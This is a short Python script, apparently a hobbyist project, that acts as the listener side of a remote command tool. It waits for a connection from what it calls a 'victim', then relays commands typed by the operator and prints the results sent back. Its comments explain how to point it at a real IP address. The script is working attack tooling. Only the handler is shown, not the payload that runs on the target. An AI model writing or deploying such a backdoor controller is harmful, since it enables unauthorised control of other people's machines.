import socket
#Create Server
#To install into server change "localhost" for IP address
Server=socket.socket()
Server.bind(("localhost",8080))
Server.listen(1)

#Loop to wait victim
while True:
    #Variables to accept connections
    Victim,Address=Server.accept()
    print(f"Conexión de {Address}")
    
    #Get message (binary)
    bin_message=Victim.recv(1024)
    
    #Encode message
    encoded_message=bin_message.decode('ascii')
    
    #If message is "1" make a loop
    if encoded_message=="1":
        while True:
            options=input("")
            Victim.send(options.encode('ascii'))
            #Save Result 
            result=Victim.recv(2048)
            #Print Result
            print(result)
    else:
        print("Error...!")
        break
